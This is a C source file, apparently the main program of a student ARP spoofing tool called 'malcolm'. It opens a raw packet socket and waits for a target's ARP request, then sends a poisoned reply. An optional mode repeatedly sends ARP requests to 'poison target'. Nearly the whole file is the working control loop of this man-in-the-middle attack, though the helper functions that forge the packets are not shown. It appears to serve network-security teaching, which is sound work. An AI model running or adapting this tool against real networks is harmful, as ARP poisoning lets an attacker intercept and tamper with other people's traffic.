//
// Created by tnoulens on 11/3/23.
//

#include "malcolm.h"

int g_packet_socket = -1;

void	tmp_handler(int sig, siginfo_t *info, void *context)
{
	(void)info;
	(void)context;
	if (sig == SIGINT)
	{
		if (g_packet_socket > -1 && close(g_packet_socket) == -1)
			error("Error: close() failed: ", errno, TRUE);
		fprintf(stdout, YELLOW"\nSIGINT received\n"RESET);
		exit(128 + SIGINT);
	}
}

void	signal_handling()
{
	struct sigaction	sa = {};

	sa.sa_flags = SA_RESTART;
	sigemptyset(&sa.sa_mask);
	sa.sa_sigaction = tmp_handler;
	sigaction(SIGINT, &sa, NULL);
}

int main(int argc, char **argv)
{
	t_data              data = {0};
	t_arp_packet        req = {0};
	uint8_t             buffer[MAX_BUF];
	const uint8_t       ether_broadcast_addr[]= {0xff,0xff,0xff,0xff, 0xff,0xff};
	struct sockaddr_ll  addr = {0};
	socklen_t           addr_len = sizeof(addr);

	welcome();
	signal_handling();
	init_checks(argc, argv, &data);
	choose_socket_type(&data);
	(void)((data.opt & VERBOSE) && getHost(&data));
	interface(&data);
	get_link_layer_addr(&data, ether_broadcast_addr, &addr);
    printf("Using interface: %s of index: %d\n", data.interface, addr.sll_ifindex);
	if (BONUS == TRUE && (data.opt & REQUEST))
	{
		build_arp_request(&data, &req);
		printf("\nARPing request to poison target..., ctrl+C to interrupt\n\n");
		(void)((data.opt & VERBOSE) && print_data(&req, NULL));
	}
	else
		printf("\nWaiting for ARP request...\n\n");
	while (TRUE)
	{
		if (BONUS == TRUE && (data.opt & REQUEST))
		{
			if (sendto(g_packet_socket, &req, sizeof(req), 0, (struct sockaddr *)&addr, sizeof(addr)) == -1)
				error("sendto() failed", errno, TRUE);
			sleep(3);
		}
		else
		{
			if (recvfrom(g_packet_socket, buffer, MAX_BUF, 0, (struct sockaddr *)&addr, &addr_len) == -1)
				error("recvfrom() failed", errno, TRUE);
			struct ethhdr *eth_hdr = (struct ethhdr *)buffer;
			t_arp_packet *arp_request = (t_arp_packet *)(buffer + ETHER_HDR_LEN);
			if (ntohs(eth_hdr->h_proto) == ETH_P_ARP)
			{
				printf("ARP packet incoming...\n");
				(void)((data.opt & VERBOSE) && print_data(arp_request, eth_hdr));
				ft_putchar_fd('\n', 1);
			}
			else
				continue ;
			if (ntohs(arp_request->arp_opcode) == ARPOP_REQUEST
				&& arp_request->arp_spa == data.target.sin_addr.s_addr
				&& (arp_request->arp_dpa & data.source.sin_addr.s_addr) == data.source.sin_addr.s_addr)
			{
				printf("ARP request received\n");
				printf(YELLOW"Who has %s ?", inet_ntoa(data.source.sin_addr));
				printf(" tell %s\n"RESET, inet_ntoa(data.target.sin_addr));
				poison(&data, arp_request, eth_hdr);
				sleep(1);
				if (sendto(g_packet_socket, &buffer, ETHER_HDR_LEN + sizeof(t_arp_packet), 0, (struct sockaddr *)&addr, addr_len) == -1)
					error("sendto() failed", errno, TRUE);
				printf(YELLOW"Reply sent\n"RESET);
				(void)((data.opt & VERBOSE) && print_data(arp_request, eth_hdr));
				break ;
			}
		}
	}
	if (close(g_packet_socket) == -1)
		error("Error: close() failed: ", errno, TRUE);
	g_packet_socket = -1;
	return (0);
}